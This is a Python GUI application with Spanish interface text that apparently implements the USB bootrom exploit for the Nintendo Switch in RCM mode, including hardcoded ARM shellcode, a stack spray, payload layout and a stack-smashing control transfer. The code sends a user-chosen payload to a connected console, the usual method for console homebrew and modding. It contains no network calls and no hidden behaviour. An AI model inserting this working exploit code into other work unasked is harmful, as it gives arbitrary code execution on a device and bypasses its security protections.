#!/usr/bin/env python3
"""
SwitchRCMInjector - GUI Application
Modern interface for injecting RCM payloads to Nintendo Switch
"""

import customtkinter as ctk
from tkinter import filedialog
import threading
import os
import sys

try:
    import usb.core
    import usb.util
except ImportError:
    print("ERROR: pyusb no instalado. Ejecuta: pip install pyusb")
    sys.exit(1)

# Constants
VENDOR_ID = 0x0955
PRODUCT_ID = 0x7321

INTERMEZZO = bytes([
    0x5c, 0x00, 0x9f, 0xe5, 0x5c, 0x10, 0x9f, 0xe5, 0x5c, 0x20, 0x9f, 0xe5, 0x01, 0x20, 0x42, 0xe0,
    0x0e, 0x00, 0x00, 0xeb, 0x48, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1,
    0x48, 0x00, 0x9f, 0xe5, 0x48, 0x10, 0x9f, 0xe5, 0x01, 0x29, 0xa0, 0xe3, 0x07, 0x00, 0x00, 0xeb,
    0x38, 0x00, 0x9f, 0xe5, 0x01, 0x19, 0xa0, 0xe3, 0x01, 0x00, 0x80, 0xe0, 0x34, 0x10, 0x9f, 0xe5,
    0x03, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb, 0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1,
    0x04, 0x30, 0x91, 0xe4, 0x04, 0x30, 0x80, 0xe4, 0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a,
    0x1e, 0xff, 0x2f, 0xe1, 0x00, 0xf0, 0x00, 0x40, 0x20, 0x00, 0x01, 0x40, 0x7c, 0x00, 0x01, 0x40,
    0x00, 0x00, 0x01, 0x40, 0x40, 0x0e, 0x01, 0x40, 0x00, 0x70, 0x01, 0x40
])

STACK_SPRAY = b'\x00\x00\x01\x40'


class RCMInjector:
    """RCM payload injection logic"""

    @staticmethod
    def find_switch():
        return usb.core.find(idVendor=VENDOR_ID, idProduct=PRODUCT_ID)

    @staticmethod
    def read_device_id(dev):
        try:
            device_id = dev.read(0x81, 16, 1000)
            return ''.join([f'{b:02X}' for b in device_id])
        except:
            return None

    @staticmethod
    def create_payload(payload_path):
        with open(payload_path, 'rb') as f:
            payload = f.read()

        if len(payload) > 0x1ed58 or len(payload) < 0x4000:
            return None

        rcm_payload = bytearray(0x30298)
        rcm_payload[0:3] = bytes([0x98, 0x02, 0x03])
        rcm_payload[0x2a8:0x2a8 + len(INTERMEZZO)] = INTERMEZZO
        rcm_payload[0x10e8:0x10e8 + 0x4000] = payload[:0x4000]

        for i in range(0x870):
            offset = 0x50e8 + i * 4
            rcm_payload[offset:offset + 4] = STACK_SPRAY

        remaining = payload[0x4000:]
        rcm_payload[0x72a8:0x72a8 + len(remaining)] = remaining

        total_size = 0x10e8 + len(payload) + 0x21c0
        total_size += 0x1000 - (total_size % 0x1000)
        if (total_size // 0x1000) % 2 == 0:
            total_size += 0x1000

        return bytes(rcm_payload[:total_size])

    @staticmethod
    def write_payload(dev, payload):
        chunk_size = 0x1000
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            try:
                dev.write(0x01, chunk, 1000)
            except:
                return False
        return True

    @staticmethod
    def smash_stack(dev):
        try:
            dev.ctrl_transfer(0x82, 0x00, 0, 0, 0x7000, 1000)
        except:
            pass
        return True


class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        # Window config
        self.title("SwitchRCMInjector")
        self.geometry("500x400")
        self.resizable(False, False)

        # Theme
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        # Variables
        self.payload_path = None
        self.switch_connected = False
        self.checking = True

        # Build UI
        self.create_widgets()

        # Start device checker
        self.check_device()

    def create_widgets(self):
        # Main frame
        self.main_frame = ctk.CTkFrame(self)
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        # Title
        self.title_label = ctk.CTkLabel(
            self.main_frame,
            text="Switch RCM Injector",
            font=ctk.CTkFont(size=24, weight="bold")
        )
        self.title_label.pack(pady=(10, 20))

        # Status frame
        self.status_frame = ctk.CTkFrame(self.main_frame)
        self.status_frame.pack(fill="x", padx=20, pady=10)

        self.status_indicator = ctk.CTkLabel(
            self.status_frame,
            text="●",
            font=ctk.CTkFont(size=20),
            text_color="red"
        )
        self.status_indicator.pack(side="left", padx=10)

        self.status_label = ctk.CTkLabel(
            self.status_frame,
            text="Switch no detectada",
            font=ctk.CTkFont(size=14)
        )
        self.status_label.pack(side="left", padx=5)

        # Payload frame
        self.payload_frame = ctk.CTkFrame(self.main_frame)
        self.payload_frame.pack(fill="x", padx=20, pady=10)

        self.payload_label = ctk.CTkLabel(
            self.payload_frame,
            text="Payload:",
            font=ctk.CTkFont(size=14)
        )
        self.payload_label.pack(side="left", padx=10)

        self.payload_name = ctk.CTkLabel(
            self.payload_frame,
            text="Ninguno seleccionado",
            font=ctk.CTkFont(size=12),
            text_color="gray"
        )
        self.payload_name.pack(side="left", padx=5, expand=True)

        self.browse_btn = ctk.CTkButton(
            self.payload_frame,
            text="Buscar",
            width=80,
            command=self.browse_payload
        )
        self.browse_btn.pack(side="right", padx=10)

        # Inject button
        self.inject_btn = ctk.CTkButton(
            self.main_frame,
            text="INYECTAR PAYLOAD",
            font=ctk.CTkFont(size=16, weight="bold"),
            height=50,
            command=self.inject_payload,
            state="disabled"
        )
        self.inject_btn.pack(fill="x", padx=20, pady=20)

        # Log
        self.log_label = ctk.CTkLabel(
            self.main_frame,
            text="Log:",
            font=ctk.CTkFont(size=12),
            anchor="w"
        )
        self.log_label.pack(fill="x", padx=20)

        self.log_text = ctk.CTkTextbox(
            self.main_frame,
            height=120,
            font=ctk.CTkFont(family="Monaco", size=11)
        )
        self.log_text.pack(fill="both", expand=True, padx=20, pady=(5, 10))

        # Load default payload if exists
        self.load_default_payload()

    def load_default_payload(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        payloads_dir = os.path.join(script_dir, "payloads")

        if os.path.exists(payloads_dir):
            for f in os.listdir(payloads_dir):
                if f.endswith(".bin"):
                    self.payload_path = os.path.join(payloads_dir, f)
                    self.payload_name.configure(text=f, text_color="white")
                    self.log(f"Payload cargado: {f}")
                    self.update_inject_button()
                    break

    def browse_payload(self):
        path = filedialog.askopenfilename(
            title="Seleccionar Payload",
            filetypes=[("Binary files", "*.bin"), ("All files", "*.*")]
        )
        if path:
            self.payload_path = path
            self.payload_name.configure(
                text=os.path.basename(path),
                text_color="white"
            )
            self.log(f"Payload seleccionado: {os.path.basename(path)}")
            self.update_inject_button()

    def log(self, message):
        self.log_text.insert("end", f"{message}\n")
        self.log_text.see("end")

    def update_status(self, connected):
        if connected:
            self.status_indicator.configure(text_color="green")
            self.status_label.configure(text="Switch detectada (RCM)")
        else:
            self.status_indicator.configure(text_color="red")
            self.status_label.configure(text="Switch no detectada")

        self.switch_connected = connected
        self.update_inject_button()

    def update_inject_button(self):
        if self.switch_connected and self.payload_path:
            self.inject_btn.configure(state="normal")
        else:
            self.inject_btn.configure(state="disabled")

    def check_device(self):
        def check():
            dev = RCMInjector.find_switch()
            connected = dev is not None

            if connected != self.switch_connected:
                self.after(0, lambda: self.update_status(connected))
                if connected:
                    self.after(0, lambda: self.log("Switch detectada en modo RCM"))

            if self.checking:
                self.after(1000, check)

        threading.Thread(target=check, daemon=True).start()

    def inject_payload(self):
        self.inject_btn.configure(state="disabled")
        self.log("Iniciando inyección...")

        def do_inject():
            try:
                # Find device
                dev = RCMInjector.find_switch()
                if not dev:
                    self.after(0, lambda: self.log("ERROR: Switch no encontrada"))
                    return

                # Setup
                try:
                    dev.set_configuration()
                except:
                    pass
                try:
                    usb.util.claim_interface(dev, 0)
                except:
                    pass

                # Read device ID
                device_id = RCMInjector.read_device_id(dev)
                if device_id:
                    self.after(0, lambda: self.log(f"Device ID: {device_id}"))

                # Create payload
                self.after(0, lambda: self.log("Creando payload RCM..."))
                rcm_payload = RCMInjector.create_payload(self.payload_path)
                if not rcm_payload:
                    self.after(0, lambda: self.log("ERROR: Payload inválido"))
                    return

                self.after(0, lambda: self.log(f"Payload size: {len(rcm_payload)} bytes"))

                # Write payload
                self.after(0, lambda: self.log("Enviando payload..."))
                if not RCMInjector.write_payload(dev, rcm_payload):
                    self.after(0, lambda: self.log("ERROR: Fallo al enviar"))
                    return

                # Smash stack
                self.after(0, lambda: self.log("Ejecutando exploit..."))
                RCMInjector.smash_stack(dev)

                self.after(0, lambda: self.log("¡ÉXITO! Payload inyectado"))
                self.after(0, lambda: self.show_success())

            except Exception as e:
                self.after(0, lambda: self.log(f"ERROR: {str(e)}"))
            finally:
                self.after(0, lambda: self.inject_btn.configure(state="normal"))

        threading.Thread(target=do_inject, daemon=True).start()

    def show_success(self):
        self.status_indicator.configure(text_color="green")
        self.status_label.configure(text="¡Payload inyectado!")

    def on_closing(self):
        self.checking = False
        self.destroy()


if __name__ == "__main__":
    app = App()
    app.protocol("WM_DELETE_WINDOW", app.on_closing)
    app.mainloop()
